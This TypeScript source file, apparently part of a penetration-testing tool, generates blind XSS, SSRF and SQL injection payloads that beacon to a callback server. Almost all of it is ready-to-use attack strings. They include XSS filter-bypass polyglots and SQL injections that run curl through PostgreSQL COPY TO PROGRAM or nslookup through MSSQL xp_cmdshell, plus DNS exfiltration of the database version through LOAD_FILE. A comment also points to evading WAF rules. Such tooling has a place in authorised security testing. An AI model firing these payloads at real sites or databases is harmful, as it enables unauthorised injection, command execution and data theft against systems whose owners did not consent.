import { randomUUID } from 'node:crypto';

/**
 * Generate blind XSS payloads that phone home to a callback URL.
 *
 * These payloads are designed to execute in a victim's browser context
 * (stored XSS, reflected XSS in admin panels, etc.) and send a request
 * back to the callback server, confirming exploitation.
 */
export function generateBlindXssPayloads(callbackUrl: string): string[] {
  const url = callbackUrl.replace(/\/+$/, '');
  const id = () => `bxss-${randomUUID()}`;

  return [
    // Basic script tag with fetch
    `<script>fetch('${url}/cb/${id()}')</script>`,

    // Image onerror (bypasses some filters that strip <script>)
    `<img src=x onerror="fetch('${url}/cb/${id()}')">`,

    // Injected after attribute close + script with Image beacon
    `"><script>new Image().src='${url}/cb/${id()}'</script>`,

    // SVG onload (bypasses some HTML sanitizers)
    `<svg onload="fetch('${url}/cb/${id()}')">`,

    // Event handler in body/div (useful for attribute injection)
    `" onfocus="fetch('${url}/cb/${id()}')" autofocus="`,

    // JavaScript protocol in href (for link injection)
    `javascript:fetch('${url}/cb/${id()}')`,

    // Polyglot: works in multiple contexts
    `'"><img src=x onerror=fetch('${url}/cb/${id()}')>`,
  ];
}

/**
 * Generate blind SSRF payloads that point to a callback server.
 *
 * These payloads cause the server to make outbound requests to the
 * callback URL, confirming that the application fetches arbitrary URLs.
 */
export function generateBlindSsrfPayloads(callbackUrl: string): string[] {
  const url = callbackUrl.replace(/\/+$/, '');
  const id = () => `bssrf-${randomUUID()}`;

  return [
    // Direct URL
    `${url}/cb/${id()}`,

    // With fragment to bypass basic URL validation
    `${url}/cb/${id()}#`,

    // URL-encoded variant
    encodeURI(`${url}/cb/${id()}`),

    // With port specification (HTTP default)
    `${url.replace(/:\/\//, '://').replace(/:\d+/, '')}:80/cb/${id()}`,

    // Protocol-relative (works if page is HTTP)
    `${url.replace(/^https?:/, '')}/cb/${id()}`,

    // With basic auth prefix bypass
    `${url.replace('://', '://anything@')}/cb/${id()}`,

    // Redirect via URL parameter (common SSRF vector)
    `${url}/cb/${id()}?redirect=true`,
  ];
}

/**
 * Generate blind SQL injection payloads that attempt out-of-band data exfiltration.
 *
 * These payloads use database-specific features to make outbound connections
 * to the callback server. The specific technique depends on the DBMS:
 *   - MySQL: LOAD_FILE() / SELECT INTO OUTFILE
 *   - PostgreSQL: COPY ... TO PROGRAM, dblink
 *   - MSSQL: xp_cmdshell, OPENROWSET
 *   - Oracle: UTL_HTTP, UTL_INADDR
 *
 * NOTE: These payloads are aggressive and may trigger WAF rules. Use with
 * the stealth profile or in controlled environments.
 */
export function generateBlindSqliPayloads(callbackUrl: string): string[] {
  const url = callbackUrl.replace(/\/+$/, '');
  const id = () => `bsqli-${randomUUID()}`;

  return [
    // MySQL: DNS exfiltration via LOAD_FILE
    `' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.${extractHost(url)}\\\\a'))-- -`,

    // MySQL: INTO OUTFILE to UNC path
    `' UNION SELECT 1 INTO OUTFILE '\\\\\\\\${extractHost(url)}\\\\cb\\\\${id()}'-- -`,

    // PostgreSQL: COPY TO PROGRAM with curl
    `'; COPY (SELECT '') TO PROGRAM 'curl ${url}/cb/${id()}'-- -`,

    // PostgreSQL: dblink for out-of-band
    `'; SELECT dblink_connect('host=${extractHost(url)} port=${extractPort(url)} dbname=d')-- -`,

    // MSSQL: xp_cmdshell with nslookup
    `'; EXEC xp_cmdshell('nslookup ${id()}.${extractHost(url)}')-- -`,

    // MSSQL: OPENROWSET for outbound HTTP
    `'; SELECT * FROM OPENROWSET('SQLOLEDB','server=${extractHost(url)}','')-- -`,

    // Oracle: UTL_HTTP to callback
    `' AND UTL_HTTP.REQUEST('${url}/cb/${id()}')='1'-- -`,

    // Oracle: UTL_INADDR for DNS
    `' AND UTL_INADDR.GET_HOST_ADDRESS('${id()}.${extractHost(url)}')='1'-- -`,

    // Generic: time-based confirmation + OOB
    `' AND 1=1 WAITFOR DELAY '0:0:5'-- -`,

    // XML external entity (XXE) via SQLi context
    `' UNION SELECT '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${url}/cb/${id()}">]><foo>&xxe;</foo>'-- -`,
  ];
}

/** Extract the host (without protocol or port) from a URL string. */
function extractHost(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    // Fallback: strip protocol and port manually
    return url.replace(/^https?:\/\//, '').replace(/:\d+.*$/, '').replace(/\/.*$/, '');
  }
}

/** Extract the port from a URL string, defaulting to 80 for http and 443 for https. */
function extractPort(url: string): number {
  try {
    const parsed = new URL(url);
    if (parsed.port) return parseInt(parsed.port, 10);
    return parsed.protocol === 'https:' ? 443 : 80;
  } catch {
    return 80;
  }
}
